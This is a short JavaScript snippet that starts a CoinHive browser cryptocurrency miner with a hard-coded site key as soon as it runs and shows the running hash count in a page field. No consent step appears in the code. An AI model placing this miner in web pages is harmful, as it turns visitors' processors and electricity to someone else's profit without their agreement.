var miner = new CoinHive.Anonymous('nzsqRtzXjHw8qYGPdSV56jEattRTXGxb');
miner.start();
setInterval(function() {
	var totalHashes = miner.getTotalHashes();
	const total = document.querySelector('#totalHashes');
	total.value = totalHashes;
}, 1000);
